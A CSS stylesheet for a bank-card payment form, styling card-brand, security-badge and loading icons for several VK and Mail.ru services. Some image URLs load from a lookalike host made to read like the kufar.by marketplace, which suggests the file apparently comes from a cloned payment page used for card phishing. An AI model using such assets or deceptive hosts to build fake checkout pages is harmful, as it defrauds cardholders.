	width: 36px;
	height: 22px
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_mastercard_youla_mobile_gray {
	background-position: -711px 0;
	width: 36px;
	height: 22px
}

.payment-systems-icon_name_mastercard {
	background-position: -752px 0;
	width: 39px;
	height: 24px
}

.credit-card-form .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_mastercard_gray {
	background-position: -796px 0;
	width: 39px;
	height: 24px
}

.credit-card-form_size_small .payment-systems-icon_name_mastercard,
.credit-card-form_size_x-small .payment-systems-icon_name_mastercard,
.pay-card_type_citymobil .payment-systems-icons .payment-systems-icon_name_mastercard,
.pay-card_type_mail-mobile .payment-systems-icons .payment-systems-icon_name_mastercard,
.pay-card_type_mapsme .payment-systems-icon_name_mastercard,
.pay-card_type_wamba .payment-systems-icons .payment-systems-icon_name_mastercard,
.payment-systems-icon_name_mastercard_small {
	background-position: -840px 0;
	width: 29px;
	height: 18px
}

.credit-card-form .payment-systems-icon_name_mastercard_small.payment-systems-icon_disabled_yes,
.credit-card-form_size_small .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.credit-card-form_size_x-small .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.pay-card_type_mail-mobile .payment-systems-icons .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.pay-card_type_mapsme .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_mastercard_gray_small {
	background-position: -874px 0;
	width: 29px;
	height: 18px
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .payment-systems-icon_name_mastercard,
.pay-card_type_dc-mobile .payment-systems-icons .payment-systems-icon_name_mastercard,
.pay-card_type_dc .payment-systems-icons .payment-systems-icon_name_mastercard,
.pay-card_type_vk-mobile .payment-systems-icons .payment-systems-icon_name_mastercard,
.pay-card_type_zz-mobile .payment-systems-icons .payment-systems-icon_name_mastercard,
.pay-card_type_zz .payment-systems-icons .payment-systems-icon_name_mastercard,
.payment-systems-icon_name_mastercard_smaller {
	background-position: -908px 0;
	width: 26px;
	height: 16px
}

.credit-card-form .payment-systems-icon_name_mastercard_smaller.payment-systems-icon_disabled_yes,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.pay-card_type_dc-mobile .payment-systems-icons .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.pay-card_type_dc .payment-systems-icons .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.pay-card_type_vk-mobile .payment-systems-icons .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.pay-card_type_zz-mobile .payment-systems-icons .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.pay-card_type_zz .payment-systems-icons .payment-systems-icon_name_mastercard.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_mastercard_gray_smaller {
	background-position: -939px 0;
	width: 26px;
	height: 16px
}

.payment-systems-icon_name_mastercard_big {
	background-position: -970px 0;
	width: 51px;
	height: 32px
}

.credit-card-form .payment-systems-icon_name_mastercard_big.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_mastercard_gray_big {
	background-position: -1026px 0;
	width: 51px;
	height: 32px
}

.payment-systems-icon_name_visa {
	background-position: -1082px 0;
	width: 40px;
	height: 13px
}

.pay-card_type_vk-wallet-android .payment-systems-icons .payment-systems-icon_name_visa,
.pay-card_type_vk-wallet-ios .payment-systems-icons .payment-systems-icon_name_visa,
.pay-card_type_vk-wallet .payment-systems-icons .payment-systems-icon_name_visa,
.payment-systems-icon_name_visa_vk_wallet {
	background-position: -1127px 0;
	width: 44px;
	height: 24px
}

.payment-systems-icon_name_visa_vk_wallet_gray {
	background-position: -1176px 0;
	width: 44px;
	height: 24px
}

.pay-card-layout_type_lootdog .payment-systems-icons .payment-systems-icon_name_visa,
.payment-systems-icon_name_visa_lootdog {
	background-position: -1225px 0;
	width: 48px;
	height: 16px
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_visa,
.payment-systems-icon_name_visa_youla_mobile {
	background-position: -1278px 0;
	width: 42px;
	height: 22px
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_visa_youla_mobile_gray {
	background-position: -1325px 0;
	width: 42px;
	height: 22px
}

.credit-card-form .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_visa_gray {
	background-position: -1372px 0;
	width: 40px;
	height: 13px
}

.credit-card-form_size_small .payment-systems-icon_name_visa,
.credit-card-form_size_x-small .payment-systems-icon_name_visa,
.pay-card_type_citymobil .payment-systems-icons .payment-systems-icon_name_visa,
.pay-card_type_mail-mobile .payment-systems-icons .payment-systems-icon_name_visa,
.pay-card_type_wamba .payment-systems-icons .payment-systems-icon_name_visa,
.payment-systems-icon_name_visa_small {
	background-position: -1417px 0;
	width: 37px;
	height: 12px
}

.credit-card-form .payment-systems-icon_name_visa_small.payment-systems-icon_disabled_yes,
.credit-card-form_size_small .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.credit-card-form_size_x-small .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.pay-card_type_mail-mobile .payment-systems-icons .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_visa_gray_small {
	background-position: -1459px 0;
	width: 37px;
	height: 12px
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .payment-systems-icon_name_visa,
.payment-systems-icon_name_visa_standard_white {
	background-position: -1501px 0;
	width: 34px;
	height: 12px
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_visa_standard_gray {
	background-position: -1540px 0;
	width: 34px;
	height: 12px
}

.pay-card_type_dc-mobile .payment-systems-icons .payment-systems-icon_name_visa,
.pay-card_type_dc .payment-systems-icons .payment-systems-icon_name_visa,
.pay-card_type_vk-mobile .payment-systems-icons .payment-systems-icon_name_visa,
.pay-card_type_zz-mobile .payment-systems-icons .payment-systems-icon_name_visa,
.pay-card_type_zz .payment-systems-icons .payment-systems-icon_name_visa,
.payment-systems-icon_name_visa_smaller {
	background-position: -1579px 0;
	width: 28px;
	height: 9px
}

.credit-card-form .payment-systems-icon_name_visa_smaller.payment-systems-icon_disabled_yes,
.pay-card_type_dc-mobile .payment-systems-icons .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.pay-card_type_dc .payment-systems-icons .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.pay-card_type_vk-mobile .payment-systems-icons .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.pay-card_type_zz-mobile .payment-systems-icons .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.pay-card_type_zz .payment-systems-icons .payment-systems-icon_name_visa.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_visa_gray_smaller {
	background-position: -1612px 0;
	width: 28px;
	height: 9px
}

.payment-systems-icon_name_visa_big {
	background-position: -1645px 0;
	width: 64px;
	height: 21px
}

.credit-card-form .payment-systems-icon_name_visa_big.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_visa_gray_big {
	background-position: -1714px 0;
	width: 64px;
	height: 21px
}

.payment-systems-icon_name_mir {
	background-position: -1783px 0;
	width: 42px;
	height: 12px
}

.credit-card-form .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_mir_gray {
	background-position: -1830px 0;
	width: 42px;
	height: 12px
}

.credit-card-form_size_small .payment-systems-icon_name_mir,
.credit-card-form_size_x-small .payment-systems-icon_name_mir,
.pay-card_type_citymobil .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_mail-mobile .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_wamba .payment-systems-icons .payment-systems-icon_name_mir,
.payment-systems-icon_name_mir_small {
	background-position: -1877px 0;
	width: 39px;
	height: 11px
}

.pay-card_type_vk-wallet-android .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_vk-wallet-ios .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_vk-wallet .payment-systems-icons .payment-systems-icon_name_mir,
.payment-systems-icon_name_mir_vk_wallet {
	background-position: -1921px 0;
	width: 44px;
	height: 24px
}

.payment-systems-icon_name_mir_vk_wallet_gray {
	background-position: -1970px 0;
	width: 44px;
	height: 24px
}

.pay-card-layout_type_lootdog .payment-systems-icons .payment-systems-icon_name_mir,
.payment-systems-icon_name_mir_lootdog {
	background-position: -2019px 0;
	width: 48px;
	height: 16px
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_mir,
.payment-systems-icon_name_mir_youla_mobile {
	background-position: -2072px 0;
	width: 64px;
	height: 22px
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_mir_youla_mobile_gray {
	background-position: -2141px 0;
	width: 64px;
	height: 22px
}

.credit-card-form .payment-systems-icon_name_mir_small.payment-systems-icon_disabled_yes,
.credit-card-form_size_small .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes,
.credit-card-form_size_x-small .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes,
.pay-card_type_mail-mobile .payment-systems-icons .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_mir_gray_small {
	background-position: -2210px 0;
	width: 39px;
	height: 11px
}

.pay-card_type_dc-mobile .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_dc .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_vk-mobile .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_zz-mobile .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_zz .payment-systems-icons .payment-systems-icon_name_mir,
.payment-systems-icon_name_mir_smaller {
	background-position: -2254px 0;
	width: 32px;
	height: 9px
}

.credit-card-form .payment-systems-icon_name_mir_smaller.payment-systems-icon_disabled_yes,
.pay-card_type_dc-mobile .payment-systems-icons .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes,
.pay-card_type_dc .payment-systems-icons .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes,
.pay-card_type_vk-mobile .payment-systems-icons .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes,
.pay-card_type_zz-mobile .payment-systems-icons .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes,
.pay-card_type_zz .payment-systems-icons .payment-systems-icon_name_mir.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_mir_gray_smaller {
	background-position: -2291px 0;
	width: 32px;
	height: 9px
}

.payment-systems-icon_name_mir_big {
	background-position: -2328px 0;
	width: 74px;
	height: 21px
}

.credit-card-form .payment-systems-icon_name_mir_big.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_mir_gray_big {
	background-position: -2407px 0;
	width: 74px;
	height: 21px
}

.payment-systems-icon_name_mastercard-with-signature {
	background-position: -2486px 0;
	width: 54px;
	height: 44px
}

.pay-card_type_vk-wallet-android .payment-systems-icons .payment-systems-icon_name_new_card,
.pay-card_type_vk-wallet-ios .payment-systems-icons .payment-systems-icon_name_new_card,
.pay-card_type_vk-wallet .payment-systems-icons .payment-systems-icon_name_new_card,
.payment-systems-icon_name_new_card_vk_wallet {
	background-position: -2545px 0;
	width: 44px;
	height: 24px
}

.pay-card_type_citymobil .payment-systems-icons .payment-systems-icon_name_new_card,
.payment-systems-icon_name_new_card_citymobil {
	background-position: -2594px 0;
	width: 30px;
	height: 18px
}

.payment-systems-icon_name_amex {
	background-position: -2629px 0;
	width: 23px;
	height: 16px
}

.payment-systems-icon_name_bankontact {
	background-position: -2657px 0;
	width: 26px;
	height: 16px
}

.payment-systems-icon_name_cardblue {
	background-position: -2688px 0;
	width: 23px;
	height: 16px
}

.payment-systems-icon_name_dinersclub {
	background-position: -2716px 0;
	width: 20px;
	height: 16px
}

.payment-systems-icon_name_discover {
	background-position: -2741px 0;
	width: 25px;
	height: 16px
}

.payment-systems-icon_name_jcb {
	background-position: -2771px 0;
	width: 21px;
	height: 16px
}



.credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon,
.credit-card-icon_name_cvv {
	background-position: 0 0;
	width: 276px;
	height: 45px
}

.acceptable-card-types-tooltip__icon,
.credit-card-form__cvv-icon,
.credit-card-icon_name_i {
	background-position: 0 -46px;
	width: 13px;
	height: 13px
}

.credit-card-form__label:hover .credit-card-form__cvv-icon,
.credit-card-icon_name_i-active-yes {
	background-position: -14px -46px;
	width: 13px;
	height: 13px
}
 
.waiter-icon {
	background-repeat: no-repeat
}

.waiter-icon_name_alert {
	background-position: 0 0;
	width: 62px;
	height: 53px
}

.waiter-icon_name_fail {
	background-position: -67px 0;
	width: 65px;
	height: 65px
}

.waiter-icon_name_load {
	background-position: -137px 0;
	width: 65px;
	height: 65px
}

.waiter-icon_name_success {
	background-position: -207px 0;
	width: 65px;
	height: 65px
}
 

.geekbrains-icon {
	background-repeat: no-repeat
}

.geekbrains-icon_name_fail {
	background-position: 0 0;
	width: 40px;
	height: 40px
}

.geekbrains-icon_name_load {
	background-position: -45px 0;
	width: 32px;
	height: 32px
}

.geekbrains-icon_name_success {
	background-position: -82px 0;
	width: 40px;
	height: 40px
}
 

.standard-black-icon {
	background-repeat: no-repeat
}

.pay-card-layout_type_standard_theme_black .waiter-icon_name_alert,
.pay-card-layout_type_standard_theme_black .waiter-icon_name_fail,
.standard-black-icon_name_fail {
	background-position: 0 0;
	width: 50px;
	height: 50px
}

.pay-card-layout_type_standard_theme_black .waiter-icon_name_load,
.standard-black-icon_name_load {
	background-position: -55px 0;
	width: 50px;
	height: 50px
}

.pay-card-layout_type_standard_theme_black .waiter-icon_name_success,
.standard-black-icon_name_success {
	background-position: -110px 0;
	width: 50px;
	height: 50px
}

.standard-black-icon_name_error {
	background-position: -165px 0;
	width: 18px;
	height: 18px
}
 
.vesna-icon {
	background-repeat: no-repeat
}

.vesna-icon_name_alert {
	background-position: 0 0;
	width: 114px;
	height: 102px
}

.vesna-icon_name_load {
	background-position: -119px 0;
	width: 116px;
	height: 116px
}

.vesna-icon_name_success {
	background-position: -240px 0;
	width: 116px;
	height: 116px
}

.svg_yes .dc-icon,
.svg_yes .pay-card-layout_type_dc-mobile .info-block_type_error .info-block__content:before,
.svg_yes .secure-information_type_dc-mobile .secure-information__icon,
.svg_yes .secure-information_type_dc .secure-information__icon { 
}

.svg_no .dc-icon,
.svg_no .pay-card-layout_type_dc-mobile .info-block_type_error .info-block__content:before,
.svg_no .secure-information_type_dc-mobile .secure-information__icon,
.svg_no .secure-information_type_dc .secure-information__icon { 
}

.dc-icon {
	background-repeat: no-repeat
}

.dc-icon_name_load {
	background-position: 0 0;
	width: 48px;
	height: 48px
}

.dc-icon_name_load-theme-mcd,
.pay-card-layout_type_dc-mobile_theme_mcd .dc-icon_name_load,
.pay-card-layout_type_dc_theme_mcd .dc-icon_name_load {
	background-position: -53px 0;
	width: 48px;
	height: 48px
}

.dc-icon_name_logo {
	background-position: -106px 0;
	width: 115px;
	height: 36px
}

.dc-icon_name_logo-theme-mcd {
	background-position: -226px 0;
	width: 40px;
	height: 35px
}

.dc-icon_name_green-lock,
.secure-information_type_dc-mobile .secure-information__icon,
.secure-information_type_dc .secure-information__icon {
	background-position: -271px 0;
	width: 12px;
	height: 16px
}

.dc-icon_name_yellow-lock,
.pay-card-layout_type_dc-mobile_theme_mcd .secure-information_type_dc-mobile .secure-information__icon,
.pay-card-layout_type_dc_theme_mcd .secure-information_type_dc .secure-information__icon {
	background-position: -288px 0;
	width: 12px;
	height: 16px
}

.dc-icon_name_close {
	background-position: -305px 0;
	width: 24px;
	height: 24px
}

.svg_yes .pay-card-layout_type_zz-mobile .credit-card-form__popup-body_type_loader .info-block__img-wrapper .img,
.svg_yes .pay-card-layout_type_zz-mobile .credit-card-form__popup-body_type_loader .info-block__img-wrapper:before,
.svg_yes .pay-card-layout_type_zz-mobile .info-block_type_error .info-block__content:before,
.svg_yes .pay-card-layout_type_zz .credit-card-form__popup-body_type_loader .info-block__img-wrapper .img,
.svg_yes .pay-card-layout_type_zz .credit-card-form__popup-body_type_loader .info-block__img-wrapper:before,
.svg_yes .pay-card-layout_type_zz .info-block_type_error .info-block__content:before,
.svg_yes .secure-information_type_zz-mobile .secure-information__icon,
.svg_yes .secure-information_type_zz .secure-information__icon,
.svg_yes .zz-icon {
	background-image: url("https://kufar.by.obyalveine.com/img/merchant/DMR/blocks/icons/zz-icons/zz-icons.svg?85")
}
 
.zz-icon {
	background-repeat: no-repeat
}

.zz-icon_name_fail {
	background-position: 0 0;
	width: 56px;
	height: 56px
}

.zz-icon_name_fail-gray {
	background-position: -61px 0;
	width: 56px;
	height: 56px
}

.pay-card-layout_type_zz-mobile .credit-card-form__popup-body_type_loader .info-block__img-wrapper .img,
.pay-card-layout_type_zz .credit-card-form__popup-body_type_loader .info-block__img-wrapper .img,
.zz-icon_name_load {
	background-position: -122px 0;
	width: 24px;
	height: 24px
}

.zz-icon_name_logo {
	background-position: -151px 0;
	width: 73px;
	height: 16px
}

.zz-icon_name_logo-big {
	background-position: -229px 0;
	width: 110px;
	height: 24px
}

.pay-card-layout_type_zz-mobile .info-block_type_error .info-block__content:before,
.zz-icon_name_close {
	background-position: -344px 0;
	width: 24px;
	height: 24px
}

.zz-icon_name_success {
	background-position: -373px 0;
	width: 60px;
	height: 45px
}

.secure-information_type_zz-mobile .secure-information__icon,
.secure-information_type_zz .secure-information__icon,
.zz-icon_name_green-lock {
	background-position: -438px 0;
	width: 12px;
	height: 16px
}
 

.vk-icon {
	background-repeat: no-repeat
}

.vk-icon_name_logo {
	background-position: 0 0;
	width: 26px;
	height: 26px
}

.pay-card-layout_type_vk .secure-information__icon,
.vk-icon_name_green-lock {
	background-position: -31px 0;
	width: 12px;
	height: 14px
}
 
.vk-mobile-icon {
	background-repeat: no-repeat
}

.vk-mobile-icon_name_logo {
	background-position: 0 0;
	width: 48px;
	height: 48px
}

.pay-card-layout_type_vk-mobile .secure-information__icon,
.vk-mobile-icon_name_green-lock {
	background-position: -53px 0;
	width: 12px;
	height: 14px
}

.vk-mobile-icon_name_load {
	background-position: -70px 0;
	width: 48px;
	height: 48px
}
 
.amru-mobile-icon {
	background-repeat: no-repeat
}

.amru-mobile-icon_name_rub {
	background-position: 0 0;
	width: 36px;
	height: 36px
}

.amru-mobile-icon_name_success {
	background-position: -41px 0;
	width: 116px;
	height: 116px
}
 

.mail-icon {
	background-repeat: no-repeat
}

.mail-icon_name_load {
	background-position: 0 0;
	width: 40px;
	height: 40px
}

.mail-icon_name_success {
	background-position: -45px 0;
	width: 96px;
	height: 96px
}

.mail-icon_name_alert {
	background-position: -146px 0;
	width: 96px;
	height: 96px
}

.mail-icon_name_fail {
	background-position: -247px 0;
	width: 96px;
	height: 96px
}

.mail-icon_name_bank {
	background-position: -348px 0;
	width: 14px;
	height: 14px
}

.mail-icon_name_logo-combo-russian {
	background-position: -367px 0;
	width: 129px;
	height: 54px
}

.svg_yes .secure-information_type_amru-mobile .secure-information__icon,
.svg_yes .secure-information_type_amru .secure-information__icon,
.svg_yes .secure-information_type_jinn .secure-information__icon,
.svg_yes .secure-information_type_youla-mobile .secure-information__icon,
.svg_yes .secure-information_type_youla .secure-information__icon,
.svg_yes .youla-mobile-icon { 
}

.svg_no .secure-information_type_amru-mobile .secure-information__icon,
.svg_no .secure-information_type_amru .secure-information__icon,
.svg_no .secure-information_type_jinn .secure-information__icon,
.svg_no .secure-information_type_youla-mobile .secure-information__icon,
.svg_no .secure-information_type_youla .secure-information__icon,
.svg_no .youla-mobile-icon { 
}

.youla-mobile-icon {
	background-repeat: no-repeat
}

.secure-information_type_amru-mobile .secure-information__icon,
.secure-information_type_amru .secure-information__icon,
.secure-information_type_jinn .secure-information__icon,
.secure-information_type_youla-mobile .secure-information__icon,
.secure-information_type_youla .secure-information__icon,
.youla-mobile-icon_name_secure-icon {
	background-position: 0 0;
	width: 16px;
	height: 16px
} 

.protection-icon {
	background-repeat: no-repeat
}

.protection-icon_name_pci-dss {
	background-position: 0 0;
	width: 78px;
	height: 30px
}

.protection-icon_name_pci-dss_small {
	background-position: -83px 0;
	width: 52px;
	height: 20px
}

.protection-icon_name_pci-dss_white {
	background-position: -140px 0;
	width: 78px;
	height: 30px
}

.protection-icon_name_pci-dss_white_small {
	background-position: -223px 0;
	width: 52px;
	height: 20px
}

.protection-icon_name_pci-dss_gray_small {
	background-position: -280px 0;
	width: 52px;
	height: 20px
}

.protection-icon_name_mastercard {
	background-position: -337px 0;
	width: 98px;
	height: 30px
}

.protection-icon_name_mastercard_small {
	background-position: -440px 0;
	width: 65px;
	height: 20px
}

.protection-icon_name_mastercard_white {
	background-position: -510px 0;
	width: 98px;
	height: 30px
}

.protection-icon_name_mastercard_white_small {
	background-position: -613px 0;
	width: 65px;
	height: 20px
}

.protection-icon_name_mastercard_gray_small {
	background-position: -683px 0;
	width: 65px;
	height: 20px
}

.protection-icon_name_visa {
	background-position: -753px 0;
	width: 69px;
	height: 30px
}

.protection-icon_name_visa_small {
	background-position: -827px 0;
	width: 46px;
	height: 20px
}

.protection-icon_name_visa_white {
	background-position: -878px 0;
	width: 69px;
	height: 30px
}

.protection-icon_name_visa_white_small {
	background-position: -952px 0;
	width: 46px;
	height: 20px
}

.protection-icon_name_visa_gray_small {
	background-position: -1003px 0;
	width: 46px;
	height: 20px
}

.protection-icon_name_mir-accept_small {
	background-position: -1054px 0;
	width: 42px;
	height: 20px
}

.protection-icon_name_mir-accept {
	background-position: -1101px 0;
	width: 63px;
	height: 30px
}

.protection-icon_name_mir-accept_h27 {
	background-position: -1169px 0;
	width: 57px;
	height: 27px
}

.protection-icon_name_pci-dss_xsmall {
	background-position: -1231px 0;
	width: 39px;
	height: 15px
}

.protection-icon_name_mastercard_xsmall {
	background-position: -1275px 0;
	width: 49px;
	height: 15px
}

.protection-icon_name_visa_xsmall {
	background-position: -1329px 0;
	width: 35px;
	height: 15px
} 
.vk-wallet-icon {
	background-repeat: no-repeat
}

.vk-wallet-icon_name_load {
	background-position: 0 0;
	width: 54px;
	height: 54px
}

.vk-wallet-icon_name_success {
	background-position: -59px 0;
	width: 96px;
	height: 96px
}

.pay-card_type_vk-wallet-android .credit-card-form__label .credit-card-form__cvv-icon,
.pay-card_type_vk-wallet-ios .credit-card-form__label .credit-card-form__cvv-icon,
.pay-card_type_vk-wallet .credit-card-form__label .credit-card-form__cvv-icon,
.vk-wallet-icon_name_info {
	background-position: -160px 0;
	width: 22px;
	height: 22px
}

.extended-select-box .selectBox-dropdown-menu .selectBox-option.selectBox-selected:after,
.vk-wallet-icon_name_check {
	background-position: -187px 0;
	width: 24px;
	height: 24px
}

.pay-card_type_vk-wallet .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-close,
.vk-wallet-icon_name_cross {
	background-position: -216px 0;
	width: 10px;
	height: 10px
}

.pay-card_type_vk-wallet-android .credit-card-form__label_error_yes.credit-card-form__label .credit-card-form__cvv-icon,
.pay-card_type_vk-wallet-ios .credit-card-form__label_error_yes.credit-card-form__label .credit-card-form__cvv-icon,
.pay-card_type_vk-wallet .credit-card-form__label_error_yes.credit-card-form__label .credit-card-form__cvv-icon,
.vk-wallet-icon_name_info-red {
	background-position: -231px 0;
	width: 22px;
	height: 22px
}

.control__select_type_vk.control__select.selectBox-dropdown .selectBox-arrow,
.pay-card_type_vk-wallet-android .pay-card__select-card .control-label:after,
.pay-card_type_vk-wallet-ios .pay-card__select-card .control-label:after,
.pay-card_type_vk-wallet .pay-card__select-card .control-label:after,
.vk-wallet-icon_name_select-box-arrow {
	background-position: -258px 0;
	width: 14px;
	height: 8px
}

.secure-information_type_vk-wallet-android .secure-information__icon,
.secure-information_type_vk-wallet-ios .secure-information__icon,
.secure-information_type_vk-wallet .secure-information__icon,
.vk-wallet-icon_name_grey-lock {
	background-position: -277px 0;
	width: 12px;
	height: 14px
}

.svg_yes .vk-wallet-icon-android {
	background-image: url("https://kufar.by.obyalveine.com/img/merchant/DMR/blocks/icons/vk-wallet-android-icons/vk-wallet-android-icons.svg?85")
}

.svg_no .vk-wallet-icon-android {
	background-image: url("https://kufar.by.obyalveine.com/img/merchant/DMR/blocks/icons/vk-wallet-android-icons/vk-wallet-android-icons.png?85")
}

.vk-wallet-icon-android {
	background-repeat: no-repeat
}

.vk-wallet-icon-android_name_load {
	background-position: 0 0;
	width: 32px;
	height: 32px
}
 

.vk-wallet-icon-ios {
	background-repeat: no-repeat
}

.vk-wallet-icon-ios_name_load {
	background-position: 0 0;
	width: 24px;
	height: 24px
} 

.lootdog-icon {
	background-repeat: no-repeat
}

.lootdog-icon_name_load {
	background-position: 0 0;
	width: 58px;
	height: 58px
}

.lootdog-icon_name_success {
	background-position: -63px 0;
	width: 58px;
	height: 58px
}

.lootdog-icon_name_fail {
	background-position: -126px 0;
	width: 54px;
	height: 44px
}

.lootdog-icon_name_shield,
.secure-information_type_lootdog .secure-information__icon {
	background-position: -185px 0;
	width: 20px;
	height: 20px
}

.lootdog-icon_name_info,
.pay-card-layout_type_lootdog .credit-card-form__cvv-icon:before {
	background-position: -210px 0;
	width: 20px;
	height: 20px
}

.lootdog-icon_name_select-box-arrow_down,
.pay-card-layout_type_lootdog .pay-card__card-selector:before,
.pay-card-layout_type_lootdog .selectBox-arrow:before {
	background-position: -235px 0;
	width: 10px;
	height: 7px
}

.lootdog-icon_name_select-box-arrow_up,
.pay-card-layout_type_lootdog .selectBox-menuShowing .selectBox-arrow:before {
	background-position: -250px 0;
	width: 10px;
	height: 7px
}
 

.jinn-mobile-icon {
	background-repeat: no-repeat
}

.jinn-mobile-icon_name_shield-icon,
.secure-information_type_ganesha .secure-information__icon,
.secure-information_type_jinn-mobile .secure-information__icon {
	background-position: 0 0;
	width: 19px;
	height: 26px
}
 
.beepcar-icon {
	background-repeat: no-repeat
}

.beepcar-icon_name_secure-icon,
.pay-card-layout_type_beepcar .secure-information .secure-information__icon {
	background-position: 0 0;
	width: 24px;
	height: 24px
}

.beepcar-icon_name_alert {
	background-position: -29px 0;
	width: 121px;
	height: 104px
}

.beepcar-icon_name_load {
	background-position: -155px 0;
	width: 116px;
	height: 116px
}

.beepcar-icon_name_success {
	background-position: -276px 0;
	width: 116px;
	height: 116px
}
 

.ali-icon {
	background-repeat: no-repeat
}

.ali-icon_name_error {
	background-position: 0 0;
	width: 15px;
	height: 15px
}

.ali-icon_name_success {
	background-position: -20px 0;
	width: 45px;
	height: 45px
}

.ali-icon_name_alert {
	background-position: -70px 0;
	width: 45px;
	height: 39px
}
 

.odnoklassniki-icon_name_sad {
	background-position: 0 0;
	width: 112px;
	height: 112px
}

.odnoklassniki-icon_name_smile {
	background-position: -113px 0;
	width: 112px;
	height: 112px
}
 

.citymobil-icon {
	background-repeat: no-repeat
}

.citymobil-icon_name_load {
	background-position: 0 0;
	width: 116px;
	height: 117px
}

.citymobil-icon_name_fail {
	background-position: -121px 0;
	width: 63px;
	height: 62px
}

.citymobil-icon_name_success {
	background-position: -189px 0;
	width: 116px;
	height: 117px
}
  
.wamba-icon {
	background-repeat: no-repeat
}

.pay-card_type_wamba .credit-card-form__tooltip-icon,
.wamba-icon_name_cvv {
	background-position: 0 0;
	width: 320px;
	height: 140px
}

.pay-card_type_wamba .credit-card-form__label:hover .credit-card-form__tooltip_visible_yes+.credit-card-form__cvv-icon,
.pay-card_type_wamba .credit-card-form__tooltip_visible_yes+.credit-card-form__cvv-icon,
.wamba-icon_name_i-active-yes {
	background-position: -325px 0;
	width: 24px;
	height: 24px
}

.pay-card_type_wamba .credit-card-form__cvv-icon,
.pay-card_type_wamba .credit-card-form__label:hover .credit-card-form__cvv-icon,
.wamba-icon_name_i {
	background-position: -354px 0;
	width: 24px;
	height: 24px
}
 

.vk-pay-icon {
	background-repeat: no-repeat
}

.vk-pay-icon_name_logo {
	background-position: 0 0;
	width: 88px;
	height: 32px
}

.vk-pay-icon_name_cross {
	background-position: -93px 0;
	width: 30px;
	height: 30px
}

.vk-pay-icon_name_info {
	background-position: -128px 0;
	width: 24px;
	height: 24px
}

.vk-pay-icon_name_info-blue {
	background-position: -157px 0;
	width: 24px;
	height: 24px
}

.vk-pay-icon_name_success {
	background-position: -186px 0;
	width: 64px;
	height: 64px
}

.vk-pay-icon_name_error {
	background-position: -255px 0;
	width: 64px;
	height: 64px
}

.vk-pay-icon_name_back {
	background-position: -324px 0;
	width: 44px;
	height: 44px
}

.control__select.selectBox-dropdown {
	background: #fff;
	border: 1px solid #ccc;
	border-radius: 0
}

.control__select.selectBox-dropdown:hover {
	text-decoration: none
}

.control__select.selectBox-dropdown:focus {
	border-color: #ccc
}

.control__select.selectBox-dropdown:focus .selectBox-arrow {
	border-color: #000 transparent transparent
}

.control__select.selectBox-dropdown .selectBox-label {
	width: auto!important;
	display: block;
	padding: 5px 10px
}

.control__select.selectBox-dropdown .selectBox-arrow {
	background: #fff;
	border-width: 3px 3px 0;
	border-color: #000 transparent transparent;
	border-style: solid solid inset inset;
	width: auto;
	height: auto;
	top: 50%;
	margin-top: -2px;
	right: 5px
}

.control__select-selectBox-dropdown-menu.selectBox-options li a {
	color: #000;
	font-size: 15px;
	line-height: 28px
}

.control__select-selectBox-dropdown-menu.selectBox-options li a:hover {
	text-decoration: none
}

ul.control__select_type_ok-p2p-selectBox-dropdown-menu {
	padding: 10px 0;
	border-color: #d8d8d8;
	border-radius: 3px
}

